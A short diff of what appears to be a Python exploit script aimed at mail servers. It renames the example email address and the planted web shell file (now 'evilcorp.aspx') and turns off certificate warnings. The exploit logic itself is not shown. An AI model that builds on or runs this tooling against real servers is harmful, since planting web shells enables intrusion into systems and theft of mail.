@@ -13,12 +13,12 @@ def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
 
 if len(sys.argv) < 2:
 	print("Usage: python3 %s <target> <email>"%sys.argv[0])
-	print("Example: python3 %s mail.evil.corp haxor@evil.corp"%sys.argv[0])
+	print("Example: python3 %s mail.evil.corp root@evil.corp"%sys.argv[0])
 	exit()
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 target = sys.argv[1]
 email = sys.argv[2]
-shell_name = "ahihi.aspx"
+shell_name = "evilcorp.aspx"
 random_name = id_generator(3) + ".js"
 user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
 
